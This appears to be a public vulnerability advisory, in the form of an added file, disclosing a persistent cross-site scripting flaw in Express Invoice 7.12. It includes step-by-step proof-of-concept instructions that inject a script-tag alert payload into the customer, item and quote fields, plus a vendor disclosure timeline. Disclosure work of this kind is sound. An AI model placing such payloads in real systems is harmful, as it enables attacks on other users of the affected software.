@@ -1,0 +1,62 @@
+# Exploit Title: Express Invoice 7.12 - 'Customer' Persistent Cross-Site Scripting
+# Exploit Author: Debashis Pal
+# Date: 2019-10-13
+# Vendor Homepage: https://www.nchsoftware.com/
+# Source: https://www.nchsoftware.com/invoice/index.html
+# Version: Express Invoice v7.12
+# CVE : N/A
+# Tested on: Windows 7 SP1(32bit)
+
+# About Express Invoice v7.12
+==============================
+Express Invoice lets you create invoices you can print, email or fax directly to clients for faster payment. 
+
+# Vulnerability 
+================
+Persistent Cross site scripting (XSS).
+
+# PoC 
+======
+
+1. Login as authenticated unprivileged user to Express Invoice version 7.12 web enable service i.e  http://A.B.C.D:96 [Default installation]. 
+
+2. Under "Invoices" Invoices List -> View Invoices -> Add New Invoice -> Customer: Field put </script><script>alert('XSS');</script>
+
+Save the change. 
+
+or 
+
+Under "Items" 
+Items -> Add new item-> Item field: put  </script><script>alert('XSS');</script>
+
+Save the change. 
+
+or 
+
+Under "Customers" 
+Customers -> Add New Customer -> Customer Name:  put  </script><script>alert('XSS');</script>
+
+Save the change. 
+
+or 
+
+Under "Quotes"
+Quotes -> View Quotes -> Add New Quote -> Customer: put  </script><script>alert('XSS');</script>
+
+Save the change. 
+
+3. Login in authenticated privileged or unprivileged  user to Express Invoice v7.12 web enable service and visit any of Invoices/Items/Customers/Quotes section, Persistent XSS payload will execute.
+
+
+# Disclosure Timeline
+======================
+Vulnerability Discover Date: 12-Sep-2019.
+Vulnerability notification to vendor via vendor provided web form: 12-Sep-2019 ,13-Sep-2019, 19-Sep-2019, 26-Sep-2019, no responds. 
+Submit exploit-db : 14-Oct-2019.
+
+
+# Disclaimer
+=============
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information.
+The author prohibits any malicious use of security related information or exploits by the author or elsewhere.
